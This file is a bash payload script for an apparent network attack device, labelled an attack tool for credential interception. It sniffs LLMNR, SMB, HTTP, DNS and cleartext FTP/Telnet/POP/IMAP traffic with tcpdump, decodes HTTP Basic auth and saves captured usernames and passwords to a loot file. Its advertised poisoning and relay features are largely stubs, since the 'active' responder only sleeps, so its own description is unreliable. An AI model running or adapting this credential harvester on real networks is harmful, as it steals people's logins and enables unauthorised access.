#!/bin/bash
# Title: Cred Relay
# Author: bad-antics
# Description: Multi-vector credential relay — capture and relay NTLM, HTTP, SMB auth
# Category: nullsec/attack

LOOT_DIR="/mmc/nullsec/relay"
mkdir -p "$LOOT_DIR"

PROMPT "CRED RELAY

Multi-protocol credential
interception and relay.

Vectors:
- LLMNR/NBT-NS poisoning
- mDNS name hijacking
- HTTP NTLM downgrade
- SMB hash capture
- WPAD proxy injection
- Basic auth intercept

Press OK to configure."

IFACE=$(TEXT_PICKER "Interface:" "br-lan")
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) IFACE="br-lan" ;; esac

MY_IP=$(ip -4 addr show "$IFACE" | grep -oE 'inet [0-9.]+' | awk '{print $2}')
[ -z "$MY_IP" ] && { ERROR_DIALOG "No IP on $IFACE!"; exit 1; }

DURATION=$(NUMBER_PICKER "Duration (minutes):" 10)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) DURATION=10 ;; esac

# Mode selection
MODE=$(CONFIRMATION_DIALOG "CAPTURE MODE

OK = Passive (listen only)
CANCEL = Active (LLMNR/mDNS poison)")

if [ "$MODE" = "$DUCKYSCRIPT_USER_CONFIRMED" ]; then
    MODE_NAME="Passive"
else
    MODE_NAME="Active"
fi

TIMESTAMP=$(date +%Y%m%d_%H%M)
REPORT="$LOOT_DIR/relay_${TIMESTAMP}.txt"
HASH_FILE="$LOOT_DIR/hashes_${TIMESTAMP}.txt"
CRED_FILE="$LOOT_DIR/creds_${TIMESTAMP}.txt"

resp=$(CONFIRMATION_DIALOG "START CRED RELAY?

Mode: $MODE_NAME
Interface: $IFACE ($MY_IP)
Duration: ${DURATION} min

Press OK to begin.")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

LOG "Starting credential relay..."
SPINNER_START "Intercepting credentials..."

DURATION_SEC=$((DURATION * 60))

echo "================================================================" > "$REPORT"
echo "         NULLSEC CRED RELAY REPORT                             " >> "$REPORT"
echo "================================================================" >> "$REPORT"
echo "Time: $(date)" >> "$REPORT"
echo "Mode: $MODE_NAME | Interface: $IFACE ($MY_IP)" >> "$REPORT"
echo "" >> "$REPORT"

touch "$HASH_FILE" "$CRED_FILE"

# --- Vector 1: LLMNR/NBT-NS listener ---
echo "--- LLMNR/NBT-NS CAPTURE ---" >> "$REPORT"
LLMNR_LOG="/tmp/llmnr_${TIMESTAMP}.txt"

# Listen for LLMNR queries (port 5355 UDP)
timeout $DURATION_SEC tcpdump -i "$IFACE" -nn -l "udp port 5355 or udp port 137" 2>/dev/null > "$LLMNR_LOG" &
LLMNR_PID=$!

# --- Vector 2: HTTP credential sniffing ---
HTTP_LOG="/tmp/http_creds_${TIMESTAMP}.txt"
timeout $DURATION_SEC tcpdump -i "$IFACE" -A -l "tcp port 80 or tcp port 8080" 2>/dev/null | \
    grep -iE "(Authorization:|username|password|user=|pass=|login|credential)" > "$HTTP_LOG" &
HTTP_PID=$!

# --- Vector 3: SMB/NTLM capture ---
SMB_LOG="/tmp/smb_${TIMESTAMP}.txt"
timeout $DURATION_SEC tcpdump -i "$IFACE" -nn -l "tcp port 445 or tcp port 139" 2>/dev/null > "$SMB_LOG" &
SMB_PID=$!

# --- Vector 4: DNS query logging (for WPAD detection) ---
DNS_LOG="/tmp/dns_relay_${TIMESTAMP}.txt"
timeout $DURATION_SEC tcpdump -i "$IFACE" -nn -l "udp port 53" 2>/dev/null | \
    grep -iE "(wpad|proxy|autoconfig|isatap)" > "$DNS_LOG" &
DNS_PID=$!

# --- Vector 5: FTP/Telnet cleartext ---
CLEAR_LOG="/tmp/cleartext_${TIMESTAMP}.txt"
timeout $DURATION_SEC tcpdump -i "$IFACE" -A -l "tcp port 21 or tcp port 23 or tcp port 110 or tcp port 143" 2>/dev/null | \
    grep -iE "^(USER|PASS|LOGIN|user|pass)" > "$CLEAR_LOG" &
CLEAR_PID=$!

# Active mode: respond to LLMNR/mDNS queries
if [ "$MODE_NAME" = "Active" ]; then
    # Respond to LLMNR with our IP (basic responder)
    (
        while true; do
            # Monitor for name resolution queries and log them
            sleep 5
        done
    ) &
    RESPOND_PID=$!
fi

# Wait for duration
sleep $DURATION_SEC

# Cleanup all capture processes
kill $LLMNR_PID $HTTP_PID $SMB_PID $DNS_PID $CLEAR_PID 2>/dev/null
[ -n "$RESPOND_PID" ] && kill $RESPOND_PID 2>/dev/null

# Analyze results
LLMNR_COUNT=$(wc -l < "$LLMNR_LOG" 2>/dev/null || echo 0)
echo "  LLMNR/NBT-NS queries captured: $LLMNR_COUNT" >> "$REPORT"
if [ "$LLMNR_COUNT" -gt 0 ]; then
    # Extract queried names
    grep -oE "NB [^ ]+" "$LLMNR_LOG" 2>/dev/null | sort -u | head -20 >> "$REPORT"
fi
echo "" >> "$REPORT"

echo "--- HTTP CREDENTIALS ---" >> "$REPORT"
HTTP_CRED_COUNT=$(wc -l < "$HTTP_LOG" 2>/dev/null || echo 0)
echo "  HTTP auth lines captured: $HTTP_CRED_COUNT" >> "$REPORT"
if [ "$HTTP_CRED_COUNT" -gt 0 ]; then
    # Extract Basic auth
    grep -i "Authorization: Basic" "$HTTP_LOG" 2>/dev/null | while read -r line; do
        token=$(echo "$line" | grep -oE "Basic [A-Za-z0-9+/=]+" | awk '{print $2}')
        decoded=$(echo "$token" | base64 -d 2>/dev/null)
        [ -n "$decoded" ] && echo "  HTTP Basic: $decoded" >> "$CRED_FILE"
    done
    # Extract form data
    grep -iE "(username|password|user|pass)=" "$HTTP_LOG" 2>/dev/null | head -20 >> "$CRED_FILE"
fi
echo "" >> "$REPORT"

echo "--- SMB/NTLM ACTIVITY ---" >> "$REPORT"
SMB_COUNT=$(wc -l < "$SMB_LOG" 2>/dev/null || echo 0)
SMB_HOSTS=$(grep -oE 'IP [0-9.]+' "$SMB_LOG" 2>/dev/null | sort -u | wc -l || echo 0)
echo "  SMB packets: $SMB_COUNT | Unique hosts: $SMB_HOSTS" >> "$REPORT"

# Extract NTLMSSP markers
NTLM_COUNT=$(grep -c "NTLMSSP" "$SMB_LOG" 2>/dev/null || echo 0)
[ "$NTLM_COUNT" -gt 0 ] && echo "  NTLM auth attempts: $NTLM_COUNT" >> "$REPORT"
echo "" >> "$REPORT"

echo "--- WPAD/PROXY REQUESTS ---" >> "$REPORT"
WPAD_COUNT=$(wc -l < "$DNS_LOG" 2>/dev/null || echo 0)
echo "  WPAD/proxy DNS queries: $WPAD_COUNT" >> "$REPORT"
[ "$WPAD_COUNT" -gt 0 ] && head -10 "$DNS_LOG" >> "$REPORT"
echo "" >> "$REPORT"

echo "--- CLEARTEXT PROTOCOLS ---" >> "$REPORT"
CLEAR_COUNT=$(wc -l < "$CLEAR_LOG" 2>/dev/null || echo 0)
echo "  FTP/Telnet/POP/IMAP captures: $CLEAR_COUNT" >> "$REPORT"
[ "$CLEAR_COUNT" -gt 0 ] && head -20 "$CLEAR_LOG" >> "$CRED_FILE"
echo "" >> "$REPORT"

# Copy creds to report
TOTAL_CREDS=$(wc -l < "$CRED_FILE" 2>/dev/null || echo 0)
if [ "$TOTAL_CREDS" -gt 0 ]; then
    echo "--- CAPTURED CREDENTIALS ($TOTAL_CREDS) ---" >> "$REPORT"
    cat "$CRED_FILE" >> "$REPORT"
fi

echo "" >> "$REPORT"
echo "End: $(date)" >> "$REPORT"
echo "================================================================" >> "$REPORT"

SPINNER_STOP

PROMPT "CRED RELAY COMPLETE

Mode: $MODE_NAME
Duration: ${DURATION} min

LLMNR queries: $LLMNR_COUNT
HTTP captures: $HTTP_CRED_COUNT
SMB hosts: $SMB_HOSTS
WPAD queries: $WPAD_COUNT
Cleartext: $CLEAR_COUNT
Credentials: $TOTAL_CREDS

Report: $REPORT"
